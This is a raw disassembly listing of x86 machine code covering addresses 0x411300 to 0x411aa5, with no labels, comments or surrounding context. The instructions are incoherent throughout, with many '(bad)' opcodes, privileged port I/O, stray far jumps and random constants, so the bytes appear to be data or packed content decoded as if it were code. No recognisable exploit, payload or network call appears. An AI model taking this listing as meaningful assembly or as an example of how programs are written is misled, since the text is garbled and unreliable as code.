  411300:	xlat   BYTE PTR ds:[ebx]
  411301:	jge    0x4112dd
  411303:	mov    dh,0x26
  411305:	xor    al,0xea
  411307:	clc    
  411308:	dec    edx
  411309:	dec    esp
  41130a:	add    DWORD PTR [eax-0x3769cde],ecx
  411310:	pop    eax
  411311:	pop    esp
  411312:	push   ds
  411313:	lods   eax,DWORD PTR ds:[esi]
  411314:	add    eax,0xdee469dd
  411319:	sbb    ebx,DWORD PTR [ebp+esi*1+0xbf0b35d]
  411320:	(bad)  
  411321:	popf   
  411322:	inc    eax
  411323:	mov    esi,0xfc239bdb
  411328:	push   ebp
  411329:	or     DWORD PTR [edi-0x1],eax
  41132c:	lea    ebx,[edx-0x67817522]
  411332:	in     al,0x24
  411334:	xchg   DWORD PTR [ebp+0x6ea0a0a2],edx
  41133a:	push   ecx
  41133b:	outs   dx,DWORD PTR ds:[esi]
  41133c:	les    edi,FWORD PTR [esi]
  41133e:	or     bh,dl
  411340:	ss mov ah,0x4c
  411343:	sub    cl,al
  411345:	mov    eax,0x871ed5ff
  41134a:	les    ebp,FWORD PTR [ebx-0x3507e585]
  411350:	popa   
  411351:	(bad)  
  411352:	shl    BYTE PTR [ebx],1
  411354:	leave  
  411355:	sbb    DWORD PTR [esi+0x25],esi
  411358:	out    dx,eax
  411359:	xchg   DWORD PTR [eax],edi
  41135b:	shr    DWORD PTR [edi],1
  41135d:	arpl   WORD PTR [edx+eiz*4-0x10],bx
  411361:	xchg   esp,eax
  411362:	xor    DWORD PTR [edx-0x5d80c796],ebp
  411368:	mov    dh,0xd1
  41136a:	stos   BYTE PTR es:[edi],al
  41136b:	sti    
  41136c:	out    0x5,al
  41136e:	mov    WORD PTR [eax+0x260e5a9a],ss
  411374:	aas    
  411375:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411376:	pushf  
  411377:	mov    eax,ds:0x3c29946d
  41137c:	mov    ebp,0x90b19c5b
  411381:	add    BYTE PTR [ebp-0x4a],dh
  411384:	sbb    DWORD PTR [ebp+0x11],esp
  411387:	jno    0x4113a7
  411389:	call   FWORD PTR [edx-0x67296a99]
  41138f:	pop    ecx
  411390:	xlat   BYTE PTR ds:[ebx]
  411391:	(bad)  
  411393:	add    al,0x7b
  411395:	rol    esp,1
  411397:	xchg   esi,eax
  411398:	repz gs jecxz 0x4113e7
  41139c:	int    0xcf
  41139e:	arpl   cx,di
  4113a0:	lods   al,BYTE PTR ds:[esi]
  4113a1:	enter  0xa44d,0x9
  4113a5:	cmp    dh,BYTE PTR [edx+ebx*8-0x1a]
  4113a9:	push   ds
  4113aa:	xor    eax,0x7edf5c4e
  4113af:	push   es
  4113b0:	and    eax,0xf709ff8b
  4113b5:	in     al,0x32
  4113b7:	pop    ss
  4113b8:	mov    ebp,esp
  4113ba:	cmp    BYTE PTR [ebp-0x6e],0xa4
  4113be:	aad    0x2
  4113c0:	int    0x63
  4113c2:	push   ecx
  4113c3:	mov    bl,0x72
  4113c6:	jbe    0x4113fe
  4113c8:	inc    ecx
  4113c9:	shr    DWORD PTR [esi+0x6d983313],cl
  4113cf:	mov    eax,?
  4113d1:	lea    ecx,[ebp-0x13]
  4113d4:	ins    DWORD PTR es:[edi],dx
  4113d5:	xor    al,0xf1
  4113d7:	xor    ah,dh
  4113d9:	push   ebp
  4113da:	lods   eax,DWORD PTR ds:[esi]
  4113db:	leave  
  4113dc:	stos   DWORD PTR es:[edi],eax
  4113dd:	sbb    DWORD PTR [ecx-0xe],ebp
  4113e0:	loope  0x411420
  4113e2:	outs   dx,DWORD PTR ds:[esi]
  4113e3:	imul   ecx,DWORD PTR [ebx-0x58],0xffffffd1
  4113e7:	cmp    bh,bh
  4113e9:	test   eax,edx
  4113eb:	xor    al,0xf3
  4113ed:	jne    0x4113ae
  4113ef:	jnp    0x4113f7
  4113f1:	ds scas al,BYTE PTR es:[edi]
  4113f3:	inc    eax
  4113f4:	mov    dl,0xa7
  4113f6:	pop    ds
  4113f7:	push   esi
  4113f8:	mov    ds:0x1c606f93,al
  4113fd:	dec    ecx
  4113fe:	sub    ah,BYTE PTR ds:0x9567904e
  411404:	stc    
  411405:	or     BYTE PTR [esi],bl
  411407:	push   esp
  411408:	les    esi,FWORD PTR [eax-0x1e62a394]
  41140e:	leave  
  41140f:	fcomp  QWORD PTR [edi]
  411411:	pop    ss
  411412:	xchg   edx,eax
  411413:	add    DWORD PTR [esi],edx
  411415:	lea    edi,[ebx+eiz*8+0x3e]
  411419:	mov    WORD PTR [ecx],ss
  41141b:	dec    eax
  41141c:	mov    ecx,0xc389aa02
  411421:	ja     0x411414
  411423:	adc    BYTE PTR [ebx+0x71],dh
  411426:	ins    DWORD PTR es:[edi],dx
  411427:	icebp  
  411428:	into   
  411429:	ret    
  41142a:	jnp    0x4113c5
  41142c:	ret    0x3b8f
  41142f:	or     cl,BYTE PTR [eax-0x704a975a]
  411435:	std    
  411436:	add    ebp,DWORD PTR [esi]
  411438:	add    al,0xa2
  41143a:	mov    ecx,0xec4ea355
  41143f:	in     eax,0x31
  411441:	push   esi
  411442:	sub    BYTE PTR [edi+0x73615c06],ch
  411448:	mov    al,0x44
  41144a:	ins    BYTE PTR es:[edi],dx
  41144b:	mov    cl,cl
  41144d:	xchg   esi,eax
  41144e:	mov    eax,edi
  411450:	lods   eax,DWORD PTR ds:[esi]
  411451:	mov    esp,eax
  411453:	stc    
  411454:	das    
  411455:	push   ecx
  411456:	pop    ecx
  411457:	and    DWORD PTR [ebx-0x115dc3e0],eax
  41145d:	loope  0x4114bc
  41145f:	cmp    al,0x86
  411461:	xor    ecx,edi
  411463:	sti    
  411464:	mov    ebp,0x273dd348
  411469:	outs   dx,DWORD PTR ds:[esi]
  41146a:	pop    es
  41146b:	(bad)  
  41146c:	sbb    BYTE PTR [ebp+0x73790a50],bl
  411472:	adc    al,0x5a
  411474:	add    al,0x5e
  411476:	nop
  411477:	retf   
  411478:	cmp    eax,0xfa3f3956
  41147d:	or     al,0xab
  41147f:	fstp   QWORD PTR [ecx+0x58]
  411482:	dec    esi
  411483:	sub    al,0x31
  411485:	push   esi
  411486:	call   0x4ec5:0xbd0f9999
  41148d:	xchg   edx,eax
  41148e:	(bad)  
  41148f:	cld    
  411490:	jmp    0x463f77b2
  411495:	arpl   WORD PTR [ebp+ebx*1+0x1e4a0bd4],ax
  41149c:	xchg   ecx,eax
  41149d:	mov    dh,0xd5
  41149f:	dec    esi
  4114a0:	arpl   WORD PTR cs:[ebx+0x36],di
  4114a4:	jle    0x411441
  4114a6:	mov    BYTE PTR [eax-0x7f],al
  4114a9:	leave  
  4114aa:	pop    DWORD PTR [ebx+0x454fe105]
  4114b0:	and    DWORD PTR [eax+0x775be3da],esp
  4114b6:	mov    al,BYTE PTR [esi-0x32]
  4114b9:	pop    eax
  4114ba:	fiadd  DWORD PTR [ebx]
  4114bc:	mov    ah,0xa
  4114be:	pop    ds
  4114bf:	outs   dx,DWORD PTR ds:[esi]
  4114c0:	cmp    edi,0xffffffdf
  4114c3:	into   
  4114c4:	dec    esp
  4114c5:	jmp    0x47f5:0x9f663211
  4114cc:	outs   dx,BYTE PTR ds:[esi]
  4114cd:	test   DWORD PTR [esi],esp
  4114cf:	pop    esp
  4114d0:	dec    edi
  4114d1:	daa    
  4114d2:	mov    al,ds:0xad2e2059
  4114d7:	call   0x6f556509
  4114dc:	cmp    DWORD PTR [ebp+0x13],esi
  4114df:	mov    ebp,0x9af78272
  4114e4:	mov    edx,0x657e774e
  4114e9:	test   BYTE PTR ds:0x2bcb4ea0,dh
  4114ef:	lock sub al,0xcc
  4114f2:	aaa    
  4114f3:	sbb    ebx,DWORD PTR [ebx+0x18]
  4114f6:	stc    
  4114f7:	clc    
  4114f8:	sub    al,0x87
  4114fa:	mov    edx,0xda726603
  4114ff:	jecxz  0x411537
  411501:	fist   WORD PTR [eax+ecx*4]
  411504:	add    BYTE PTR [eax],ah
  411506:	or     DWORD PTR [ecx],edi
  411508:	inc    esi
  411509:	cmp    ebx,0x4bd110e8
  41150f:	xlat   BYTE PTR ds:[ebx]
  411510:	jnp    0x4114ba
  411512:	iret   
  411513:	sbb    al,0x48
  411515:	call   0x1a0b:0x7e5a8315
  41151c:	inc    ebp
  41151d:	dec    esp
  41151e:	mov    ebp,0x518afdc0
  411523:	mov    dh,0x40
  411525:	dec    eax
  411526:	arpl   WORD PTR [eax+0x67],cx
  411529:	lods   eax,DWORD PTR ds:[esi]
  41152a:	ins    BYTE PTR es:[edi],dx
  41152b:	(bad)  
  41152c:	repz push 0x25
  41152f:	pop    ebp
  411530:	mov    bh,0xb1
  411532:	into   
  411533:	jae    0x41158b
  411535:	pop    ecx
  411536:	(bad)  
  411537:	into   
  411538:	cmp    eax,0x5ba04b16
  41153d:	dec    eax
  41153e:	and    eax,0x9d7e16f3
  411543:	addr16 daa 
  411545:	adc    ah,cl
  411547:	sub    esi,edx
  411549:	loope  0x4115bc
  41154b:	xchg   DWORD PTR [edx],esp
  41154d:	jge    0x411519
  41154f:	adc    esi,edx
  411551:	repnz pusha 
  411553:	aaa    
  411554:	pop    esp
  411555:	add    al,0x64
  411557:	inc    ebp
  411558:	dec    esi
  411559:	push   ds
  41155a:	pop    edx
  41155b:	in     al,0x20
  41155d:	xchg   ecx,esp
  41155f:	fld    QWORD PTR [esi-0x20e2ad0d]
  411565:	sub    esi,DWORD PTR [edi+0x3544f385]
  41156b:	mov    DWORD PTR [edx+edx*8+0x46],edx
  41156f:	sub    al,0x32
  411571:	jmp    0x4115f0
  411573:	(bad)  
  411574:	xchg   DWORD PTR [ebp+0x55],esi
  411577:	lock shr DWORD PTR [ebp+0x8],0xd6
  41157c:	dec    edx
  41157d:	add    BYTE PTR ds:0xf75e55dc,ch
  411583:	(bad)  
  411584:	sbb    eax,0x287c268d
  411589:	dec    ebp
  41158a:	inc    eax
  41158b:	cli    
  41158c:	adc    ebx,DWORD PTR [esi-0x4881e256]
  411592:	in     eax,0xa1
  411594:	fisttp DWORD PTR [ecx]
  411596:	push   0xaf9da33b
  41159b:	mov    esi,0x142efa3e
  4115a0:	ds jp  0x41158a
  4115a3:	push   0xf4a0da4
  4115a8:	aad    0xa5
  4115aa:	sub    eax,0xf4a472a4
  4115af:	ja     0x411574
  4115b1:	inc    edi
  4115b2:	ficom  DWORD PTR ds:[ebx]
  4115b5:	ret    
  4115b6:	fsubr  DWORD PTR [edi]
  4115b8:	fidiv  WORD PTR [edx]
  4115ba:	inc    edx
  4115bb:	mov    ah,0xc0
  4115bd:	add    eax,0x2139018
  4115c2:	js     0x411557
  4115c4:	scas   eax,DWORD PTR es:[edi]
  4115c5:	rcl    DWORD PTR [ecx+0x1d],0x92
  4115c9:	cmp    BYTE PTR [eax],ch
  4115cb:	mov    edi,fs
  4115cd:	ret    
  4115ce:	and    al,0xe1
  4115d0:	xchg   DWORD PTR ds:0xdde37d32,ebp
  4115d6:	mov    eax,0x9ced5c4e
  4115db:	fwait
  4115dc:	lds    ecx,FWORD PTR [edi]
  4115de:	ins    DWORD PTR es:[edi],dx
  4115df:	mov    ah,0xcc
  4115e1:	mov    al,0x7d
  4115e3:	test   al,0x7e
  4115e5:	stos   BYTE PTR es:[edi],al
  4115e6:	push   eax
  4115e7:	jge    0x41163a
  4115e9:	inc    ecx
  4115ea:	addr16 leave 
  4115ec:	jbe    0x41158a
  4115ee:	out    dx,eax
  4115ef:	add    BYTE PTR [ecx],ah
  4115f1:	lahf   
  4115f2:	or     al,0x30
  4115f4:	xor    ebx,DWORD PTR [ebx-0x7a]
  4115f7:	pusha  
  4115f8:	das    
  4115f9:	dec    eax
  4115fa:	jmp    0x4115b7
  4115fc:	hlt    
  4115fd:	inc    edi
  4115fe:	xor    al,BYTE PTR [esi]
  411600:	inc    esp
  411601:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411602:	dec    DWORD PTR [eax+0x18248e07]
  411608:	xchg   edx,eax
  411609:	call   0x6d49d44d
  41160e:	test   DWORD PTR [edi+0x5b],0x97d52dbf
  411615:	xor    eax,0x554411a5
  41161a:	xchg   DWORD PTR [ebp-0x31],edi
  41161d:	sbb    BYTE PTR [ebx-0x3589ebea],ah
  411623:	je     0x4115f2
  411625:	inc    esi
  411626:	cwde   
  411627:	xchg   ebp,eax
  411628:	out    dx,eax
  411629:	and    al,0x84
  41162b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41162c:	fucomp st(6)
  41162e:	sbb    eax,0x8a09efe6
  411633:	ins    BYTE PTR es:[edi],dx
  411634:	in     al,0x49
  411636:	jns    0x4115be
  411638:	test   al,0x18
  41163a:	sbb    al,0xa7
  41163c:	and    al,0x96
  41163e:	in     eax,0xaf
  411640:	sub    DWORD PTR ds:0xb1e4d970,ebp
  411646:	sbb    edi,DWORD PTR [ebp-0x4492cccf]
  41164c:	ror    BYTE PTR [ebx+0x895fd],0x73
  411653:	mov    WORD PTR [ebx],gs
  411655:	das    
  411656:	stc    
  411657:	cmp    eax,0xd3285ce7
  41165c:	fidivr DWORD PTR [ebx-0x2d88cb9a]
  411662:	mov    ds:0xe2116937,eax
  411667:	clc    
  411668:	mov    ecx,DWORD PTR [esi-0x5]
  41166b:	push   esp
  41166c:	clc    
  41166d:	mov    eax,ds:0x9fb4a544
  411672:	idiv   ecx
  411674:	in     eax,0x5
  411676:	mov    esp,0x9a4fad1f
  41167b:	aas    
  41167c:	aam    0x0
  41167e:	lea    ecx,[edx]
  411680:	imul   ax,WORD PTR [esp+eax*2+0x17],0xff94
  411686:	jmp    0xdc6b4313
  41168b:	inc    ecx
  41168c:	inc    eax
  41168d:	ins    DWORD PTR es:[edi],dx
  41168e:	cmp    al,0x49
  411690:	mov    bl,0xb2
  411692:	jp     0x41166b
  411694:	test   al,bl
  411696:	xlat   BYTE PTR ds:[ebx]
  411697:	xor    eax,0x339b0120
  41169c:	sub    al,0xa3
  41169e:	mov    esi,0xd008c336
  4116a3:	xor    DWORD PTR [edi],edi
  4116a5:	out    dx,al
  4116a6:	les    eax,FWORD PTR [edx]
  4116a8:	es inc esp
  4116aa:	jne    0x411694
  4116ac:	(bad)  
  4116ad:	repnz add DWORD PTR [esi-0x4867c039],0xffffff84
  4116b5:	push   ebp
  4116b6:	inc    ecx
  4116b7:	ror    BYTE PTR [esi],cl
  4116b9:	pop    edi
  4116ba:	cmp    bl,BYTE PTR [edi+0x21dbf498]
  4116c0:	push   ebx
  4116c1:	sbb    eax,0x367ff6e4
  4116c7:	inc    esi
  4116c8:	ret    
  4116c9:	mov    bh,cl
  4116cb:	jns    0x41171c
  4116cd:	gs inc ecx
  4116cf:	lock lods eax,DWORD PTR ds:[esi]
  4116d1:	pop    ebp
  4116d2:	inc    edi
  4116d3:	scas   al,BYTE PTR es:[edi]
  4116d4:	fs pusha 
  4116d6:	dec    esp
  4116d7:	pop    ss
  4116d8:	test   BYTE PTR [ebp-0x42],bl
  4116db:	fild   QWORD PTR [ebx-0x594c280]
  4116e1:	fs sbb eax,0xd54e36d
  4116e7:	or     al,0x14
  4116e9:	scas   al,BYTE PTR es:[edi]
  4116ea:	out    dx,al
  4116eb:	xchg   ebx,eax
  4116ec:	cmp    esi,DWORD PTR ds:0x21dd8b87
  4116f2:	faddp  st(1),st
  4116f4:	jns    0x41170f
  4116f6:	mov    BYTE PTR [ecx-0xf],ah
  4116f9:	xor    BYTE PTR [ebp-0x2ae3e8bb],bl
  4116ff:	and    ebx,DWORD PTR [edx+0x3d7ef6c1]
  411705:	xchg   ebp,eax
  411706:	xor    BYTE PTR [ebx-0x78e9af09],al
  41170c:	(bad)  
  41170d:	shr    ecx,1
  41170f:	inc    ecx
  411710:	mul    BYTE PTR [edi+ecx*8]
  411713:	aas    
  411714:	stos   BYTE PTR es:[edi],al
  411715:	ss mov bh,0xfe
  411718:	adc    esp,0xa427bde4
  41171e:	mov    WORD PTR [ebx+0xd8d18b8],gs
  411724:	les    edi,FWORD PTR [ebx+0x667e375]
  41172a:	int3   
  41172b:	inc    ebp
  41172c:	movhps QWORD PTR [edi+0x44],xmm6
  411730:	adc    al,0xcf
  411732:	imul   edx,DWORD PTR [ebp-0x78],0xffffffee
  411736:	les    ebx,FWORD PTR [eax+0x3bb8074c]
  41173c:	sbb    BYTE PTR [ebp+ecx*8+0x56],dh
  411740:	arpl   WORD PTR [ebx+0x12],si
  411743:	inc    ecx
  411744:	cmp    BYTE PTR [ecx+0x41c403da],bh
  41174a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41174b:	out    dx,al
  41174c:	xchg   ebp,eax
  41174d:	add    ecx,DWORD PTR [esi-0x7a]
  411750:	lods   al,BYTE PTR ds:[esi]
  411751:	pop    esp
  411752:	loopne 0x411750
  411754:	pop    es
  411755:	in     eax,0xd6
  411757:	dec    edi
  411758:	stos   DWORD PTR es:[edi],eax
  411759:	inc    edx
  41175a:	xchg   edi,eax
  41175b:	push   cs
  41175c:	into   
  41175d:	ud1    ebp,DWORD PTR [edi-0x10]
  411761:	push   edi
  411762:	push   esp
  411763:	xor    edx,DWORD PTR [edi]
  411765:	clc    
  411766:	jmp    0xe6366799
  41176b:	imul   BYTE PTR ds:0x25ee4cef
  411771:	sub    eax,DWORD PTR [ecx-0x3fe21215]
  411777:	rsm    
  411779:	pop    edi
  41177a:	lahf   
  41177b:	imul   esi,DWORD PTR [ecx+0x4b2906b5],0x4
  411782:	sub    BYTE PTR [ecx-0x836e559],ah
  411788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411789:	push   ebp
  41178a:	jo     0x411720
  41178c:	dec    eax
  41178d:	pop    ss
  41178e:	mov    edx,0xc5c6a865
  411793:	sbb    ecx,esi
  411795:	cli    
  411796:	dec    eax
  411797:	adc    al,bl
  411799:	jle    0x411804
  41179b:	dec    edi
  41179c:	jo     0x4117a3
  41179e:	stos   DWORD PTR es:[edi],eax
  41179f:	pop    edi
  4117a0:	aas    
  4117a1:	dec    eax
  4117a2:	daa    
  4117a3:	lds    edi,FWORD PTR ds:0xd7d11ac9
  4117a9:	lds    edi,FWORD PTR [ebx+eiz*1]
  4117ac:	lock cli 
  4117ae:	daa    
  4117af:	inc    edx
  4117b0:	cmc    
  4117b1:	loop   0x411815
  4117b3:	leave  
  4117b4:	ret    0x3937
  4117b7:	jo     0x41174b
  4117b9:	mov    ah,0xfe
  4117bb:	sub    eax,0x3d96e388
  4117c0:	push   esp
  4117c1:	shr    BYTE PTR [edi-0x21],0x95
  4117c5:	shl    DWORD PTR [eax],1
  4117c7:	mov    edx,0x54d1cad3
  4117cc:	ret    0xc607
  4117cf:	popf   
  4117d0:	inc    ecx
  4117d1:	cmp    ecx,DWORD PTR [esi]
  4117d3:	cwde   
  4117d4:	shl    ebp,1
  4117d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d7:	fwait
  4117d8:	leave  
  4117d9:	fcom   DWORD PTR [ebx+esi*1+0x6da23469]
  4117e0:	sahf   
  4117e1:	or     eax,0xde796a49
  4117e6:	and    BYTE PTR [eax],dh
  4117e8:	dec    edx
  4117e9:	rcl    BYTE PTR [ebp-0x169faccd],0x99
  4117f0:	push   ebp
  4117f1:	(bad)
  4117f4:	xchg   edx,eax
  4117f5:	test   al,0x8b
  4117f7:	ret    0x88db
  4117fa:	mov    ebp,0xf0eb6f7c
  4117ff:	fmul   DWORD PTR [ebp+0x5e]
  411802:	lods   al,BYTE PTR ds:[esi]
  411803:	loop   0x411850
  411805:	cmp    eax,0x401aedfc
  41180a:	jl     0x4117ef
  41180c:	ret    0x7d02
  41180f:	ret    0x3862
  411812:	repz loop 0x41181c
  411815:	or     al,0x6a
  411817:	fs daa 
  411819:	adc    DWORD PTR [ebp-0x6704249d],esp
  41181f:	loopne 0x4117f2
  411821:	(bad)  
  411822:	mov    bh,0x46
  411824:	or     DWORD PTR [eax+0x61a3306b],eax
  41182a:	(bad)  
  41182b:	mov    ch,0xc1
  41182d:	inc    esi
  41182e:	shr    ch,cl
  411830:	push   es
  411831:	pushf  
  411832:	sub    eax,0x507e20aa
  411837:	or     eax,0x283980f4
  41183c:	sbb    ebx,DWORD PTR [ebp-0x41f75f6f]
  411842:	mov    eax,0x835e50b6
  411847:	push   ecx
  411848:	xor    BYTE PTR [edx-0x27],cl
  41184b:	loop   0x41183a
  41184d:	xchg   esi,eax
  41184e:	sar    eax,1
  411850:	cld    
  411851:	cmp    al,0x98
  411853:	rcl    BYTE PTR [ecx*1-0x672affbe],1
  41185a:	shl    DWORD PTR [esi],1
  41185c:	adc    al,cl
  41185e:	sub    al,0xb
  411860:	adc    esi,DWORD PTR [esi+ebx*1-0x13]
  411864:	(bad)  
  411865:	cmp    edx,DWORD PTR cs:[eax-0x1d]
  411869:	hlt    
  41186a:	scas   al,BYTE PTR es:[edi]
  41186b:	dec    edx
  41186c:	fild   QWORD PTR [esi]
  41186e:	mov    dl,0x4a
  411870:	popf   
  411871:	mov    esp,0xe5048022
  411876:	push   ss
  411877:	jl     0x411831
  411879:	cmp    BYTE PTR [edi-0x75ca239b],0xc0
  411880:	aas    
  411881:	lods   al,BYTE PTR ds:[esi]
  411882:	out    dx,eax
  411883:	(bad)  
  411884:	cli    
  411885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411886:	sahf   
  411887:	(bad)  
  411888:	sub    eax,0x338a8250
  41188d:	push   es
  41188e:	fxch   st(4)
  411890:	fdivr  DWORD PTR [eax+ebx*2-0x39]
  411894:	out    dx,al
  411895:	add    BYTE PTR [ecx-0x6f],0xf0
  411899:	fisttp QWORD PTR [eax-0x62cadbed]
  41189f:	rcr    BYTE PTR [edi],0x16
  4118a2:	pop    eax
  4118a3:	pop    esi
  4118a4:	sti    
  4118a5:	loop   0x41189d
  4118a7:	inc    edx
  4118a8:	fcmovb st,st(2)
  4118aa:	les    ebp,FWORD PTR [esi-0x78]
  4118ad:	mov    dh,0x4c
  4118af:	dec    esi
  4118b0:	das    
  4118b1:	out    dx,eax
  4118b2:	popa   
  4118b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118b4:	cmp    al,0xfd
  4118b6:	push   0x2
  4118b8:	ret    0xcb32
  4118bb:	test   esi,edx
  4118bd:	fidiv  DWORD PTR [esi]
  4118bf:	aaa    
  4118c0:	pop    ebp
  4118c1:	push   es
  4118c2:	popa   
  4118c3:	fs jmp 0x7f88:0xedcec398
  4118cb:	aad    0x2f
  4118cd:	or     dh,dh
  4118cf:	aad    0xb5
  4118d1:	jno    0x411929
  4118d3:	xor    BYTE PTR [ebx+eax*1+0x15b4168],bl
  4118da:	es sti 
  4118dc:	mov    bl,0xf
  4118de:	jbe    0x411922
  4118e0:	jb     0x4118b0
  4118e2:	dec    esp
  4118e3:	inc    esp
  4118e4:	dec    DWORD PTR [eax-0x768bae30]
  4118ea:	xchg   esi,eax
  4118eb:	fld    DWORD PTR [ecx+0x5b]
  4118ee:	or     al,0x45
  4118f0:	mov    ebp,0x316a6de4
  4118f5:	addr16 mov ecx,0xd163d214
  4118fb:	mov    esp,0xdcf775e7
  411900:	hlt    
  411901:	jnp    0x411940
  411903:	jg     0x411924
  411905:	sbb    DWORD PTR [ecx],esi
  411907:	add    eax,0xfef8bb6
  41190c:	pop    esi
  41190d:	dec    ebx
  41190e:	inc    ebp
  41190f:	push   ss
  411910:	cmc    
  411911:	popf   
  411912:	test   eax,0x792c0d3
  411917:	mov    ds:0x63ddd13,al
  41191c:	add    eax,0x3d4f0f7d
  411921:	arpl   WORD PTR [ebx-0x3c],di
  411924:	push   ebp
  411925:	je     0x41190c
  411927:	inc    eax
  411928:	xlat   BYTE PTR ds:[ebx]
  411929:	clc    
  41192a:	or     al,BYTE PTR [edx]
  41192c:	ins    BYTE PTR es:[edi],dx
  41192d:	sub    DWORD PTR [eax-0x3bedd836],ebp
  411933:	aaa    
  411934:	int    0x73
  411936:	xchg   ebx,eax
  411937:	sub    edx,ebp
  411939:	stc    
  41193a:	lock pop edx
  41193c:	push   ecx
  41193d:	ret    
  41193e:	mov    DWORD PTR [esi+0x16ca6f4],edx
  411944:	test   BYTE PTR [ecx-0x1b],dl
  411947:	int3   
  411948:	push   ecx
  411949:	jns    0x41198b
  41194b:	xor    BYTE PTR [edx],dh
  41194d:	push   ebx
  41194e:	in     al,dx
  41194f:	jp     0x411921
  411951:	fisub  WORD PTR [edx-0x53217a42]
  411957:	mov    DWORD PTR [edi],esp
  411959:	jle    0x411903
  41195b:	jae    0x4119b2
  41195d:	daa    
  41195e:	xor    ebx,DWORD PTR [ebx]
  411960:	lds    ecx,FWORD PTR [ebp+edx*4-0x19f2934e]
  411967:	sub    eax,0x294a7f60
  41196c:	or     ecx,esi
  41196e:	push   ds
  41196f:	sar    BYTE PTR fs:[esi-0x30177acf],1
  411976:	retf   
  411977:	cld    
  411978:	xor    ecx,esi
  41197a:	xchg   edx,eax
  41197b:	inc    eax
  41197c:	repnz cwde 
  41197e:	mov    WORD PTR [esp+edi*2+0x7d8623e4],ds
  411985:	add    al,BYTE PTR [esi-0x68feb35e]
  41198b:	lods   eax,DWORD PTR ds:[esi]
  41198c:	pop    ecx
  41198d:	sub    eax,0x93483125
  411992:	pop    ecx
  411993:	cmp    al,0xb3
  411995:	test   al,0x73
  411997:	xchg   edi,eax
  411998:	js     0x411984
  41199a:	mov    al,ds:0x908585be
  41199f:	pop    edx
  4119a0:	push   eax
  4119a1:	lahf   
  4119a2:	pop    ss
  4119a3:	inc    edi
  4119a4:	xor    BYTE PTR [edi+0x4e10b3ac],cl
  4119aa:	mov    ds:0x396257d6,al
  4119af:	pop    edi
  4119b0:	in     eax,0x59
  4119b2:	cwde   
  4119b3:	xchg   ebx,eax
  4119b4:	das    
  4119b5:	(bad)  
  4119b6:	call   0xdfd2615b
  4119bb:	les    esi,FWORD PTR [edi]
  4119bd:	hlt    
  4119be:	cs mov esi,0xa11b4ed4
  4119c4:	dec    esp
  4119c5:	push   0x3a1b2fab
  4119ca:	add    bh,cl
  4119cc:	sbb    BYTE PTR [eax],bh
  4119ce:	jp     0x4119ff
  4119d0:	mov    ecx,0xceffd8a8
  4119d5:	jns    0x4119a4
  4119d7:	mov    esi,0x52b2f95f
  4119dc:	fsub   DWORD PTR [ebx-0x6e65b59f]
  4119e2:	ins    DWORD PTR es:[edi],dx
  4119e3:	and    bl,BYTE PTR [ebp-0x29]
  4119e6:	xchg   edi,eax
  4119e7:	adc    DWORD PTR [edi],esi
  4119e9:	(bad)  
  4119ea:	pop    ss
  4119eb:	fcomp  DWORD PTR [esi]
  4119ed:	lds    esi,FWORD PTR [ecx-0x50]
  4119f0:	mov    edx,0xbaf33135
  4119f5:	push   ebx
  4119f6:	xchg   edx,eax
  4119f7:	pushf  
  4119f8:	push   ds
  4119f9:	cmp    BYTE PTR [esi+0x34254d78],bh
  4119ff:	adc    eax,0xed9bfbaa
  411a04:	sub    BYTE PTR [eax+eiz*1],bh
  411a07:	push   esp
  411a08:	or     DWORD PTR [ecx-0x341d6a63],esi
  411a0e:	or     eax,0x765aca5c
  411a13:	arpl   WORD PTR [edx],bx
  411a15:	popf   
  411a16:	add    bl,BYTE PTR [ebx-0x31]
  411a19:	pushf  
  411a1a:	cdq    
  411a1b:	pop    eax
  411a1c:	pusha  
  411a1d:	outs   dx,BYTE PTR ds:[esi]
  411a1e:	frstor [edi-0x2a]
  411a21:	pop    edi
  411a22:	mov    esp,0x46bdbf3f
  411a27:	outs   dx,BYTE PTR ds:[esi]
  411a28:	mov    ds:0x2f05d911,al
  411a2d:	in     eax,0x3c
  411a2f:	(bad)  
  411a30:	pop    edi
  411a31:	popf   
  411a32:	sbb    BYTE PTR [eax],bl
  411a34:	xchg   edx,eax
  411a35:	and    BYTE PTR [ebp+0x5aba4d56],bl
  411a3b:	out    dx,al
  411a3c:	int3   
  411a3d:	or     BYTE PTR [eax+esi*4-0x60],al
  411a41:	fimul  DWORD PTR [edx-0x48]
  411a44:	cmp    esp,ebp
  411a46:	adc    BYTE PTR [ebp+0x4c],bl
  411a49:	mov    esi,0x467f75d8
  411a4e:	sti    
  411a4f:	daa    
  411a50:	les    esi,FWORD PTR [edx]
  411a52:	adc    al,0xf5
  411a54:	ins    BYTE PTR es:[edi],dx
  411a55:	les    edi,FWORD PTR [ebx+0x3920b944]
  411a5b:	or     DWORD PTR [eax+0x48],ecx
  411a5e:	es scas al,BYTE PTR es:[edi]
  411a60:	add    edx,DWORD PTR [ecx-0x7c07e119]
  411a66:	pop    edi
  411a67:	pop    ecx
  411a68:	out    dx,eax
  411a69:	or     al,0x82
  411a6b:	push   0x30
  411a6d:	and    BYTE PTR [edx],0x6c
  411a70:	jbe    0x411a62
  411a72:	out    dx,eax
  411a73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a74:	inc    eax
  411a75:	arpl   WORD PTR [ecx-0x1bbe5499],di
  411a7b:	aaa    
  411a7c:	stos   BYTE PTR es:[edi],al
  411a7d:	push   ebx
  411a7e:	sub    eax,ebp
  411a80:	xchg   ebx,eax
  411a81:	aad    0x3d
  411a83:	stos   DWORD PTR es:[edi],eax
  411a84:	cli    
  411a85:	inc    ecx
  411a86:	into   
  411a87:	paddd  mm6,QWORD PTR [esi+0x59]
  411a8b:	scas   al,BYTE PTR es:[edi]
  411a8c:	xor    dh,dl
  411a8e:	sub    eax,0x958b6520
  411a93:	fdivr  DWORD PTR [eax]
  411a95:	xor    eax,0xf0273a7d
  411a9a:	sbb    BYTE PTR [ebx],0x44
  411a9d:	(bad)  [edx]
  411a9f:	test   al,0x17
  411aa1:	inc    esi
  411aa2:	inc    ecx
  411aa3:	jmp    0x411a87
  411aa5:	les    ebp,FWORD PTR [esi-0x20]
